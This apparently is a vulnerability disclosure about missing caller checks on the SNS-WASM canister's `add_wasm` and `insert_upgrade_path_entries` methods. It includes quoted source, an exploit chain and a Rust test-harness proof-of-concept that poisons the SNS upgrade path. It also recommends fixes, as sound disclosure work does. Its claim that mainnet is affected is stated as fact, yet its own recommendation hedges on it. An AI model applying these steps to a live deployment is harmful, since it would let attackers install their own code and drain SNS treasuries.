### Title
Unauthenticated `insert_upgrade_path_entries` and `add_wasm` When `access_controls_enabled=false` Allows Any Caller to Poison the SNS Upgrade Path — (`rs/nns/sns-wasm/canister/canister.rs`)

---

### Summary

The SNS-WASM canister's authorization guard for `insert_upgrade_path_entries` (and `add_wasm`) is gated on a runtime flag `access_controls_enabled`. The default value of this flag is `false` in `SnsWasmCanisterInitPayloadBuilder::new()`, and the production NNS genesis init tool (`rs/nns/init/src/main.rs`) never calls `with_sns_wasm_access_controls(true)`. As a result, on any deployment initialized via the default builder — including the mainnet SNS-WASM canister — any unprivileged principal can call both `add_wasm` and `insert_upgrade_path_entries` without restriction, allowing them to inject arbitrary WASMs into the upgrade path and cause all live SNS instances to install attacker-controlled code on the next `UpgradeSnsToNextVersion` proposal.

---

### Finding Description

**Root cause — default `false` in the builder:**

`SnsWasmCanisterInitPayloadBuilder::new()` hard-codes `access_controls_enabled: false`: [1](#0-0) 

**Root cause — production init tool never enables controls:**

`rs/nns/init/src/main.rs` builds the NNS init payload using `NnsInitPayloadsBuilder::new()` (which internally uses `SnsWasmCanisterInitPayloadBuilder::new()`) and only configures `sns_subnet_ids`. It never calls `with_sns_wasm_access_controls(true)`: [2](#0-1) 

**Root cause — guard is a no-op when flag is `false`:**

Both `add_wasm` and `insert_upgrade_path_entries` check `if access_controls_enabled && caller() != GOVERNANCE_CANISTER_ID`. When the flag is `false`, the entire `if` branch is skipped and the call proceeds unconditionally: [3](#0-2) 

**Confirmed by an existing test:**

The test `insert_upgrade_path_entries_callable_by_anyone_when_access_controls_disabled` explicitly verifies that with `access_controls_enabled=false`, a random user's call is processed (the error returned is the *business-logic* error "No Upgrade Paths in request", not an authorization error): [4](#0-3) 

**Exploit chain:**

1. Attacker calls `add_wasm` with a malicious WASM blob, passing `skip_update_latest_version: Some(true)` so `latest_version` is not changed and the injection is less visible.
2. Attacker calls `insert_upgrade_path_entries` with `{current: legitimate_version, next: attacker_version}` where `attacker_version` references the hash of the malicious WASM just uploaded. The inner logic only checks that the referenced WASM hashes exist in `wasm_indexes` — it does not check the caller: [5](#0-4) 

3. Any SNS governance canister at `legitimate_version` calls `get_next_sns_version` (using its own canister ID as the caller). `get_next_version` looks up the upgrade path map and returns `attacker_version`: [6](#0-5) 

4. SNS governance's `UpgradeSnsToNextVersion` proposal execution calls `get_upgrade_params`, which calls `get_next_version` and then fetches the WASM bytes for `attacker_version` from SNS-WASM via `get_wasm`. It then installs that WASM on the target SNS canister: [7](#0-6) 

---

### Impact Explanation

Every live SNS instance that executes an `UpgradeSnsToNextVersion` proposal while at `legitimate_version` will install the attacker's WASM. The attacker's WASM can drain treasury accounts, steal staked tokens, disable governance, or exfiltrate private state. With dozens of deployed SNS instances each controlling significant token treasuries, the financial impact easily exceeds $1M.

---

### Likelihood Explanation

The precondition (`access_controls_enabled=false`) is the **default** and is what the production genesis init tool produces. The exploit requires no privileged access, no key material, and no social engineering — only the ability to send ingress messages to the SNS-WASM canister, which is a public NNS canister. The attack is silent (no on-chain proposal is required) and can be executed atomically in two update calls.

---

### Recommendation

1. **Immediate:** Change `SnsWasmCanisterInitPayloadBuilder::new()` to default `access_controls_enabled: true`.
2. **Immediate:** Add `with_sns_wasm_access_controls(true)` to `rs/nns/init/src/main.rs` and to `rs/pocket_ic_server/src/pocket_ic.rs`.
3. **If mainnet is currently running with `false`:** Submit an NNS proposal to upgrade the SNS-WASM canister with a `post_upgrade` hook that forces `access_controls_enabled = true` regardless of the stored stable-memory value.
4. **Defense-in-depth:** Consider removing the flag entirely and always requiring `GOVERNANCE_CANISTER_ID` as the caller for state-mutating methods.

---

### Proof of Concept

```rust
// State-machine test skeleton
let machine = StateMachineBuilder::new().with_current_time().build();
let nns_init_payload = NnsInitPayloadsBuilder::new()
    // NOTE: no .with_sns_wasm_access_controls(true) — mirrors production init tool
    .with_initial_invariant_compliant_mutations()
    .with_test_neurons()
    .with_sns_dedicated_subnets(machine.get_subnet_ids())
    .build();
setup_nns_canisters(&machine, nns_init_payload);

let attacker = PrincipalId::new_user_test_id(1337);

// Step 1: Upload malicious WASM as attacker
let malicious_wasm = vec![0x00, 0x61, 0x73, 0x6d, /* ... */];
let malicious_hash = sha256(&malicious_wasm);
let add_resp: AddWasmResponse = update_with_sender(
    &machine, SNS_WASM_CANISTER_ID, "add_wasm",
    AddWasmRequest {
        wasm: Some(SnsWasm { wasm: malicious_wasm, canister_type: SnsCanisterType::Governance.into(), proposal_id: None }),
        hash: malicious_hash.to_vec(),
        skip_update_latest_version: Some(true),
    },
    attacker,
).unwrap();
assert!(matches!(add_resp.result, Some(add_wasm_response::Result::Hash(_))));

// Step 2: Redirect upgrade path as attacker
let attacker_version = SnsVersion { governance_wasm_hash: malicious_hash.to_vec(), ..legitimate_version.clone() };
let insert_resp: InsertUpgradePathEntriesResponse = update_with_sender(
    &machine, SNS_WASM_CANISTER_ID, "insert_upgrade_path_entries",
    InsertUpgradePathEntriesRequest {
        upgrade_path: vec![SnsUpgrade {
            current_version: Some(legitimate_version.clone()),
            next_version: Some(attacker_version.clone()),
        }],
        sns_governance_canister_id: None,
    },
    attacker,
).unwrap();
assert_eq!(insert_resp.error, None); // succeeds — no auth check

// Step 3: Verify SNS governance would receive the poisoned version
let next: GetNextSnsVersionResponse = query(
    &machine, SNS_WASM_CANISTER_ID, "get_next_sns_version",
    GetNextSnsVersionRequest { current_version: Some(legitimate_version), governance_canister_id: None },
).unwrap();
assert_eq!(next.next_version.unwrap().governance_wasm_hash, malicious_hash.to_vec());
// Any SNS at legitimate_version executing UpgradeSnsToNextVersion now installs attacker WASM.
```

### Citations

**File:** rs/nns/sns-wasm/src/init.rs (L16-24)
```rust
    pub fn new() -> Self {
        SnsWasmCanisterInitPayloadBuilder {
            payload: SnsWasmCanisterInitPayload {
                sns_subnet_ids: vec![],
                access_controls_enabled: false,
                allowed_principals: vec![],
            },
        }
    }
```

**File:** rs/nns/init/src/main.rs (L177-254)
```rust
    let mut init_payloads_builder = NnsInitPayloadsBuilder::new();

    add_registry_content(
        &mut init_payloads_builder,
        args.initial_registry.as_ref(),
        args.registry_local_store_dir.as_ref(),
    );

    if let Some(path) = &args.initial_neurons {
        eprintln!("{LOG_PREFIX}Initializing neurons from CSV file: {path:?}");
        init_payloads_builder.with_neurons_from_csv_file(path);
    } else {
        eprintln!(
            "{LOG_PREFIX}Initial neuron CSV or PB path not specified, initializing with test neurons"
        );
        init_payloads_builder
            // We need some neurons, because we need to vote on some proposals to create subnets.
            .with_test_neurons();
    }

    let mut test_ledger_accounts = vec![];

    for principal in &args.initialize_ledger_with_test_accounts_for_principals {
        test_ledger_accounts.push(icp_ledger::AccountIdentifier::new(*principal, None));
    }
    for account_hex in &args.initialize_ledger_with_test_accounts {
        test_ledger_accounts.push(
            icp_ledger::AccountIdentifier::from_hex(account_hex)
                .expect("failed to parse ledger account identifier"),
        );
    }

    for account in test_ledger_accounts.into_iter() {
        init_payloads_builder
            .ledger
            .init_args()
            .unwrap()
            .initial_values
            .insert(
                account,
                icp_ledger::Tokens::from_tokens(1_000_000_000).expect("Couldn't create icpts"),
            );
        eprintln!(
            "{}Initializing with test ledger account: {}",
            LOG_PREFIX,
            account.to_hex(),
        );
    }

    if args.initialize_with_gtc_neurons {
        init_payloads_builder.genesis_token.sr_months_to_release =
            args.months_to_release_seed_round_gtc_neurons;
        init_payloads_builder.genesis_token.ect_months_to_release =
            args.months_to_release_ect_gtc_neurons;

        init_payloads_builder.with_gtc_neurons();
    }

    init_payloads_builder
        .genesis_token
        .donate_account_recipient_neuron_id = Some(GTC_DONATE_ACCOUNT_RECIPIENT_NEURON_ID);

    init_payloads_builder
        .genesis_token
        .forward_whitelisted_unclaimed_accounts_recipient_neuron_id =
        Some(GTC_FORWARD_ALL_UNCLAIMED_ACCOUNTS_RECIPIENT_NEURON_ID);

    init_payloads_builder.sns_wasms.with_sns_subnet_ids(
        args.sns_subnet
            .iter()
            .cloned()
            .map(SubnetId::from)
            .collect(),
    );

    println!("{LOG_PREFIX}Initialized governance.");

    init_payloads_builder.build()
```

**File:** rs/nns/sns-wasm/canister/canister.rs (L301-325)
```rust
#[update]
fn add_wasm(add_wasm_payload: AddWasmRequest) -> AddWasmResponse {
    let access_controls_enabled =
        SNS_WASM.with(|sns_wasm| sns_wasm.borrow().access_controls_enabled);
    if access_controls_enabled && caller() != GOVERNANCE_CANISTER_ID.into() {
        AddWasmResponse::error("add_wasm can only be called by NNS Governance".into())
    } else {
        SNS_WASM.with(|sns_wasm| sns_wasm.borrow_mut().add_wasm(add_wasm_payload))
    }
}

#[update]
fn insert_upgrade_path_entries(
    payload: InsertUpgradePathEntriesRequest,
) -> InsertUpgradePathEntriesResponse {
    let access_controls_enabled =
        SNS_WASM.with(|sns_wasm| sns_wasm.borrow().access_controls_enabled);
    if access_controls_enabled && caller() != GOVERNANCE_CANISTER_ID.into() {
        InsertUpgradePathEntriesResponse::error(
            "insert_upgrade_path_entries can only be called by NNS Governance".into(),
        )
    } else {
        SNS_WASM.with(|sns_wasm| sns_wasm.borrow_mut().insert_upgrade_path_entries(payload))
    }
}
```

**File:** rs/nns/sns-wasm/tests/upgrade_sns_instance.rs (L1022-1054)
```rust
#[test]
fn insert_upgrade_path_entries_callable_by_anyone_when_access_controls_disabled() {
    let machine = StateMachineBuilder::new().with_current_time().build();

    let nns_init_payload = NnsInitPayloadsBuilder::new()
        .with_sns_wasm_access_controls(false)
        .with_initial_invariant_compliant_mutations()
        .with_test_neurons()
        .with_sns_dedicated_subnets(machine.get_subnet_ids())
        .build();

    setup_nns_canisters(&machine, nns_init_payload);

    let response: InsertUpgradePathEntriesResponse = update_with_sender(
        &machine,
        SNS_WASM_CANISTER_ID,
        "insert_upgrade_path_entries",
        InsertUpgradePathEntriesRequest {
            upgrade_path: vec![],
            sns_governance_canister_id: None,
        },
        PrincipalId::new_user_test_id(1),
    )
    .unwrap();

    // We get an error past the access controls (request was actually processed)
    assert_eq!(
        response,
        InsertUpgradePathEntriesResponse::error(
            "No Upgrade Paths in request. No action taken.".to_string()
        )
    );
}
```

**File:** rs/nns/sns-wasm/src/sns_wasm.rs (L579-628)
```rust
        // Ensure we have the WASMs in the submitted versions, otherwise the SNS could not execute
        // the upgrade request.
        for version in versions_submitted {
            let hash = match vec_to_hash(version) {
                Ok(h) => h,
                Err(e) => return InsertUpgradePathEntriesResponse::error(e),
            };
            if !self.wasm_indexes.contains_key(&hash) {
                return InsertUpgradePathEntriesResponse::error(
                    "Upgrade paths include WASM hashes that do not reference WASMs known by SNS-W"
                        .to_string(),
                );
            }
        }

        // Ensure the governance canister in the request belongs to a known SNS.
        if let Some(sns_governance_canister_id) = sns_governance_canister_id {
            // Note, if we ever get a substantial list here, we should make a data structure to
            // make this faster.
            if !self.deployed_sns_list.iter().any(|deployment| {
                deployment.governance_canister_id.is_some()
                    && deployment.governance_canister_id.unwrap()
                        == sns_governance_canister_id.into()
            }) {
                return InsertUpgradePathEntriesResponse::error(format!(
                    "Cannot add custom upgrade path for non-existent SNS.  Governance canister {sns_governance_canister_id} \
                     not found in list of deployed SNSes."
                ));
            }
        }

        if let Some(sns_governance_canister_id) = sns_governance_canister_id {
            for upgrade_step in upgrade_path {
                self.upgrade_path.insert_sns_specific_upgrade_path_entry(
                    upgrade_step.current_version.unwrap(),
                    upgrade_step.next_version.unwrap(),
                    sns_governance_canister_id,
                );
            }
        } else {
            for upgrade_step in upgrade_path {
                self.upgrade_path.insert_upgrade_path_entry(
                    upgrade_step.current_version.unwrap(),
                    upgrade_step.next_version.unwrap(),
                );
            }
        }

        InsertUpgradePathEntriesResponse { error: None }
    }
```

**File:** rs/nns/sns-wasm/src/sns_wasm.rs (L1906-1924)
```rust
    pub fn get_next_version(
        &self,
        from_version: SnsVersion,
        caller: PrincipalId,
    ) -> Option<SnsVersion> {
        match CanisterId::try_from(caller) {
            // If not a canister id, just check normal path
            Err(_) => self.upgrade_path.get(&from_version).cloned(),
            // Check if special entry
            Ok(canister_id) => match self.sns_specific_upgrade_path.get(&canister_id) {
                // No special entry, use normal path map
                None => self.upgrade_path.get(&from_version).cloned(),
                // Special canister path map, but if no entry for version, fallback to regular path
                Some(emergency_paths) => emergency_paths
                    .get(&from_version)
                    .or_else(|| self.upgrade_path.get(&from_version))
                    .cloned(),
            },
        }
```

**File:** rs/sns/governance/src/governance.rs (L2839-2889)
```rust
        let UpgradeSnsParams {
            next_version,
            canister_type_to_upgrade,
            new_wasm_hash,
            canister_ids_to_upgrade,
        } = get_upgrade_params(&*self.env, root_canister_id, &current_version)
            .await
            .map_err(|err| {
                GovernanceError::new_with_message(
                    ErrorType::InvalidProposal,
                    format!("Could not execute proposal: {err}"),
                )
            })?;

        self.push_to_upgrade_journal(upgrade_journal_entry::UpgradeStarted::from_proposal(
            current_version.clone(),
            next_version.clone(),
            ProposalId { id: proposal_id },
        ));

        let target_wasm = get_wasm(&*self.env, new_wasm_hash.to_vec(), canister_type_to_upgrade)
            .await
            .map_err(|e| {
                GovernanceError::new_with_message(
                    ErrorType::External,
                    format!("Could not execute proposal: {e}"),
                )
            })?
            .wasm;

        let target_is_root = canister_ids_to_upgrade.contains(&root_canister_id);

        if target_is_root {
            upgrade_canister_directly(
                &*self.env,
                root_canister_id,
                target_wasm,
                Encode!().unwrap(),
            )
            .await?;
        } else {
            for target_canister_id in canister_ids_to_upgrade {
                self.upgrade_non_root_canister(
                    target_canister_id,
                    Wasm::Bytes(target_wasm.clone()),
                    Encode!().unwrap(),
                    CanisterInstallMode::Upgrade,
                )
                .await?;
            }
        }
```
